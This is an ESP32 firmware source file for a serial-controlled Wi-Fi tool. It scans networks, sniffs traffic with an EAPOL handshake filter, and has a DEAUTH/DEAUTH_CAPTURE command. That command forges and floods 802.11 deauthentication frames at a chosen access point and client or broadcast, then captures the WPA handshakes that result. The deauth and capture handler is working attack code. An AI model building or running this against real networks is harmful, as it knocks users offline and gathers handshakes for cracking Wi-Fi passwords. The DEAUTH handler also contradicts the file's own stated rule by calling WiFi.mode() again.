#include <Arduino.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include "BridgeProtocol.h"
#include "sniffer.h"

// ── Chip name ────────────────────────────────────────────────────────────────
#if defined(CONFIG_IDF_TARGET_ESP32C3)
    #define CHIP_NAME "ESP32-C3"
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
    #define CHIP_NAME "ESP32-S3"
#elif defined(CONFIG_IDF_TARGET_ESP32S2)
    #define CHIP_NAME "ESP32-S2"
#else
    #define CHIP_NAME "ESP32"
#endif

BridgeProtocol proto(Serial);
Sniffer        sniffer;

// ── Radio state machine ───────────────────────────────────────────────────────
//
// DESIGN RULE: WiFi.mode() is called ONCE in setup() → WIFI_MODE_APSTA.
// It is NEVER called again anywhere in this file.
//
// Why: every WiFi.mode() call on ESP-IDF tears down and rebuilds the wifi
// task state machine. APSTA → STA takes 3-8 s and can silently fail if a
// scan or promiscuous callback is still active. STA → APSTA after the scan
// triggers the same hazard in reverse. This is the root cause of the
// "second scan returns None / hangs 30 s" bug.
//
// Solution: stay in APSTA permanently.
//   - Scanning: use esp_wifi_scan_* IDF calls directly (they work in APSTA).
//   - Raw TX:   esp_wifi_80211_tx(WIFI_IF_AP, ...) works in APSTA.
//   - Sniffing: promiscuous mode works in APSTA.
//
// The only shared-radio conflict is scan vs promiscuous — we stop the
// sniffer before scanning and restart it after if needed.

// ── IDF-level scan (replaces WiFi.scanNetworks) ───────────────────────────────
// WiFi.scanNetworks() internally checks if mode == STA and refuses to run
// in APSTA on some IDF versions. We call the IDF API directly which has no
// such restriction.
static int idf_scan_networks() {
    wifi_scan_config_t cfg = {};
    cfg.ssid        = nullptr;
    cfg.bssid       = nullptr;
    cfg.channel     = 0;       // 0 = all channels
    cfg.show_hidden = true;
    cfg.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 100;
    cfg.scan_time.active.max = 300;

    esp_err_t err = esp_wifi_scan_start(&cfg, true);  // true = block until done
    if (err != ESP_OK) {
        Serial.printf("[SCAN] esp_wifi_scan_start failed: %d\n", err);
        return -1;
    }

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    return (int)count;
}

// ── helpers ───────────────────────────────────────────────────────────────────
static bool parseMac(const char* str, uint8_t out[6]) {
    if (!str || !str[0]) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

static const char* authModeStr(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/WPA3-PSK";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI-PSK";
        default:                        return "UNKNOWN";
    }
}

static void radioIdle() {
    // Bring radio to a clean idle state without changing the WiFi mode.
    // Called before scan and before deauth to ensure a known starting point.
    sniffer.stop();
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(80));
}

// ── Raw frame TX ──────────────────────────────────────────────────────────────
static void send_raw_frame(const uint8_t* buf, int len) {
    // Send 3× with 1 ms gap — improves delivery rate on busy channels.
    // WIFI_IF_AP works in APSTA mode (which we stay in permanently).
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    vTaskDelay(pdMS_TO_TICKS(1));
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    vTaskDelay(pdMS_TO_TICKS(1));
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    vTaskDelay(pdMS_TO_TICKS(1));
}

// ── Command handler ───────────────────────────────────────────────────────────
void handleCmd(uint8_t id, JsonDocument& doc) {
    const char* cmd = doc["cmd"] | "";
    if (cmd[0] == '\0') {
        proto.sendResp(id, false, "missing cmd");
        return;
    }

    // ── PING ─────────────────────────────────────────────────────────────────
    if (strcmp(cmd, "PING") == 0) {
        proto.sendResp(id, true, "pong");
    }

    // ── STATUS ───────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STATUS") == 0) {
        JsonDocument resp;
        resp["ok"]       = true;
        resp["uptime"]   = millis();
        resp["heap"]     = ESP.getFreeHeap();
        resp["chip"]     = CHIP_NAME;
        resp["sniffing"] = sniffer.active();
        if (sniffer.active()) {
            resp["channel"] = sniffer.channel();
            resp["hopping"] = sniffer.hopping();
        }
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── ECHO ─────────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "ECHO") == 0) {
        const char* msg = doc["args"]["msg"] | "no msg";
        JsonDocument resp;
        resp["ok"]   = true;
        resp["echo"] = msg;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── START_SNIFF ───────────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_SNIFF") == 0) {
        const char* mode      = doc["args"]["mode"] | "fixed";
        bool        eapolOnly = doc["args"]["eapol_only"] | false;
        const char* bssidStr  = doc["args"]["bssid"] | "";

        uint8_t bssid[6];
        bool hasBssid = parseMac(bssidStr, bssid);
        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr);

        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startHop(interval);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            ok = sniffer.startFixed(channel);
        }
        proto.sendResp(id, ok, ok ? "sniffing started"
                                  : "invalid args (channel must be 1-13)");
    }

    // ── STOP_SNIFF ────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_SNIFF") == 0) {
        SniffStats s = sniffer.stats();
        sniffer.stop();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── SET_CHANNEL ───────────────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_CHANNEL") == 0) {
        uint8_t channel = doc["args"]["channel"] | 1;
        bool ok = sniffer.setChannel(channel);
        proto.sendResp(id, ok, ok ? "channel set"
                                  : "invalid channel (must be 1-13)");
    }

    // ── SCAN_WIFI ─────────────────────────────────────────────────────────────
    //
    // Key change: no WiFi.mode() calls. We stay in APSTA the whole time.
    // We stop the sniffer + promiscuous (they conflict with scan), run the
    // IDF scan directly, then re-enable promiscuous if sniffing was active.
    //
    else if (strcmp(cmd, "SCAN_WIFI") == 0) {
        bool wasSniffing = sniffer.active();
        uint8_t prevChannel = sniffer.channel();
        bool wasHopping = sniffer.hopping();

        radioIdle();    // stop sniffer + promiscuous, no mode change

        // IDF scan — works in APSTA, does not require STA-only mode
        int n = idf_scan_networks();
        if (n < 0) {
            proto.sendResp(id, false, "scan failed");
            return;
        }

        // Retrieve results
        if (n > 0) {
            uint16_t count = (uint16_t)n;
            wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
                count * sizeof(wifi_ap_record_t));

            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
                for (int i = 0; i < count; i++) {
                    char bssid_str[18];
                    snprintf(bssid_str, sizeof(bssid_str),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             records[i].bssid[0], records[i].bssid[1],
                             records[i].bssid[2], records[i].bssid[3],
                             records[i].bssid[4], records[i].bssid[5]);

                    JsonDocument ev;
                    ev["ssid"]     = (char*)records[i].ssid;
                    ev["bssid"]    = bssid_str;
                    ev["channel"]  = records[i].primary;
                    ev["rssi"]     = records[i].rssi;
                    ev["security"] = authModeStr(records[i].authmode);
                    proto.sendEvent("scan_ap", ev);
                }
            }
            free(records);
        }

        esp_wifi_scan_stop();   // release scan resources

        JsonDocument resp;
        resp["ok"]    = true;
        resp["count"] = n;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());

        Serial.printf("[SCAN] Found %d networks.\n", n);

        // Restore sniffer if it was running before the scan
        if (wasSniffing) {
            if (wasHopping) {
                sniffer.startHop(300);
            } else {
                sniffer.startFixed(prevChannel);
            }
            Serial.println("[SCAN] Sniffer restored.");
        }
    }


else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
        // 1. Step directly into the dynamic arguments payload object
        JsonVariant args = doc["args"];
        
        // 2. Safe parsing extraction supporting high iteration limits
        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150; 
        uint8_t  reason     = args["reason"].as<uint8_t>()  ? args["reason"].as<uint8_t>()  : 7;

        // Extract pacing configuration interval securely
        uint16_t intervalMs = 100;
        if (args.containsKey("deauth_interval_ms")) {
            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
        } else if (args.containsKey("interval")) {
            intervalMs = args["interval"].as<uint16_t>();
        }

        // Extract string representations or fall back to standard templates
        const char* bssidStr  = args["bssid"]  | "00:00:00:00:00:00";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";

        uint8_t bssid[6]  = {0};
        uint8_t client[6] = {0};
        
        // Parse raw text configurations into physical network arrays
        parseMac(bssidStr,  bssid);
        parseMac(clientStr, client);

        // 3. Clear transient sniffer operations completely 
        sniffer.stop();
        esp_wifi_set_promiscuous(false);
        delay(50);

        // 4. Force-cycle the wireless driver subsystem to flush memory ring buffers
        esp_wifi_stop();
        
        WiFi.mode(WIFI_MODE_APSTA);

        wifi_config_t ap_cfg = {};
        if (esp_wifi_get_config(WIFI_IF_AP, &ap_cfg) == ESP_OK) {
            ap_cfg.ap.channel = channel; // Sync the interface controller context channel
            esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        }

        // Start the radio engine and force physical RF frequency alignment
        esp_wifi_start();
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        // Settlement window to allow hardware locks to stabilize
        delay(250); 

        // 5. Build raw 802.11 template frame array architecture
        uint8_t runtime_frame[26] = {
            0xC0, 0x00,                         // 0-1: Frame Control (Deauth)
            0x00, 0x00,                         // 2-3: Duration
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // 4-9: Addr1 (Destination)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15: Addr2 (Source)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21: Addr3 (BSSID Base)
            0x00, 0x00,                         // 22-23: Sequence Control
            0x00, 0x07                          // 24-25: Reason Code Default
        };

        // Transfer verified target addresses into frame boundaries
        memcpy(runtime_frame + 4,  client, 6);
        memcpy(runtime_frame + 10, bssid,  6);
        memcpy(runtime_frame + 16, bssid,  6);

        uint32_t total_sent  = 0;
        uint16_t seq_tracker = 0x0010;

        // 6. Production-Scale Transmission Loop
        for (uint32_t i = 0; i < count; i++) {
            runtime_frame[22] = seq_tracker & 0xFF;
            runtime_frame[23] = (seq_tracker >> 8) & 0xFF;
            
            runtime_frame[24] = 0x00;
            runtime_frame[25] = reason; 

            // Pass parameters straight to native driver queues
            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, runtime_frame, 26, true);
            if (tx_err == ESP_OK) {
                total_sent++;
            }
            
            seq_tracker += 0x0010; // Shift sequence controller forward
            delay(intervalMs);     // Direct loop pacing delay
        }

        // 7. Re-initialize background capture mechanics if requested
        if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
            sniffer.setEapolFilter(true, bssid);
            sniffer.startFixed(channel);
        }

        // 8. Compile and return final telemetry payload update back to Python script
        JsonDocument statsDoc;
        statsDoc["status"]      = "finished";
        statsDoc["bssid"]       = bssidStr;
        statsDoc["client"]      = clientStr;
        statsDoc["channel"]     = (int)channel;
        statsDoc["count"]       = (uint32_t)count;
        statsDoc["interval_ms"] = (int)intervalMs;
        statsDoc["reason"]      = (int)reason;
        statsDoc["sent_frames"] = (uint32_t)total_sent;
        
        proto.sendEvent("deauth_stats", statsDoc);
        
        // Deliver acknowledgment response token back to the script thread
        proto.sendResp(id, true);
    }

    else {
        proto.sendResp(id, false, "unknown command");
    }
}

// ── ACK handler ──────────────────────────────────────────────────────────────
void handleAck(uint32_t chunk_index) {
    sniffer.onAck(chunk_index);
}

// ── Heartbeat ────────────────────────────────────────────────────────────────
void sendHeartbeat() {
    static uint32_t last = 0;
    if (millis() - last < 5000) return;
    last = millis();
    JsonDocument doc;
    doc["uptime"] = millis();
    doc["heap"]   = ESP.getFreeHeap();
    proto.sendEvent("heartbeat", doc);
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    delay(500);

    // ── ONE-TIME radio init: APSTA and nothing else ever again ────────────────
    //
    // APSTA gives us:
    //   STA interface  → IDF scan, association (future)
    //   AP interface   → esp_wifi_80211_tx raw frame injection
    //
    // We configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
    // ssid_hidden=1 + max_connection=0 means no client can ever associate.
    WiFi.mode(WIFI_MODE_APSTA);

    wifi_config_t ap_cfg = {};
    strcpy((char*)ap_cfg.ap.ssid, "esp32tool");
    ap_cfg.ap.ssid_len       = 9;
    ap_cfg.ap.channel        = 1;
    ap_cfg.ap.ssid_hidden    = 1;
    ap_cfg.ap.max_connection = 0;
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    // Promiscuous OFF at boot — sniffer.begin() also ensures this
    esp_wifi_set_promiscuous(false);

    proto.onCmd(handleCmd);
    proto.onAck(handleAck);
    sniffer.begin(proto);

    Serial.println("ESP32_READY");
}

// ── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
    proto.update();
    sendHeartbeat();
    sniffer.processQueue();
    sniffer.handleHop();
}
